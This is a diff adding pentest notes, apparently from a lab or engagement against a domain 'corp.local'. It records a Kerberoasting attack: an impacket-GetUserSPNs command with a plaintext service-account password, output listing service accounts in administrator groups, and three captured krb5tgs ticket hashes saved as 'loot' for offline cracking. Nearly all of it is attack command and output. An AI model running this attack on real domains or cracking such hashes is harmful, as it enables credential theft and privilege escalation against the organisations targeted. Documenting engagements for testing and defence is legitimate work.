@@ -1,0 +1,23 @@
+### Kerberoasting (authenticated as svc_sql)
+impacket-GetUserSPNs 'corp.local/svc_sql:Password123' -dc-ip 172.16.202.131 -request -outputfile loot/kerberoast.txt
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName                 Name        MemberOf                                                                      PasswordLastSet             LastLogon                   Delegation 
+-----------------------------------  ----------  ----------------------------------------------------------------------------  --------------------------  --------------------------  ----------
+HTTP/intranet.corp.local             svc_sql     CN=Administrators,CN=Builtin,DC=corp,DC=local                                 2026-09-26 09:24:48.537789  <never>                                
+MSSQLSvc/db01.corp.local             svc_sql     CN=Administrators,CN=Builtin,DC=corp,DC=local                                 2026-09-26 09:24:48.537789  <never>                                
+MSSQLSvc/db01.corp.local:1433        svc_sql     CN=Administrators,CN=Builtin,DC=corp,DC=local                                 2026-09-26 09:24:48.537789  <never>                                
+OracleSvc/db-prod.corp.local         svc_oracle  CN=Database-Operators,OU=Database_Admins,OU=TitanCorp,DC=corp,DC=local        2026-10-24 21:44:52.771072  <never>                                
+OracleSvc/db-prod.corp.local:1521    svc_oracle  CN=Database-Operators,OU=Database_Admins,OU=TitanCorp,DC=corp,DC=local        2026-10-24 21:44:52.771072  <never>                                
+MSSQLSvc/bi-cluster.corp.local:1433  titan_api   CN=Core-Infrastructure-Admins,OU=IT_Operations,OU=TitanCorp,DC=corp,DC=local  2026-10-24 21:52:49.724117  2026-10-24 22:27:21.833850             
+HTTP/api-bi.corp.local:8443          titan_api   CN=Core-Infrastructure-Admins,OU=IT_Operations,OU=TitanCorp,DC=corp,DC=local  2026-10-24 21:52:49.724117  2026-10-24 22:27:21.833850             
+
+
+
+[-] CCache file is not found. Skipping...
+
+### hashes
+3 loot/kerberoast.txt
+$krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*$0ce4760d66eb819011edd45c9a3a987f$6cac84ccc81bac08536501ba9141a1b745d6ce6e43dd8b7e3a348c62ac136eda98577f82f98
+$krb5tgs$23$*svc_oracle$CORP.LOCAL$corp.local/svc_oracle*$1208fa430767ec43fc77303f33b68041$1301132b0942d07da3869f561ff89f5c5c60a59d3e6e9b2e39a50b1280e80b596c5c9
+$krb5tgs$23$*titan_api$CORP.LOCAL$corp.local/titan_api*$ea75081cd8f9273f15d66bb2ce9fc456$f5d7f3abde3d29912074d0e29ffdc65b7c602856af735833dc8a1f0ecc109b96a7c816b
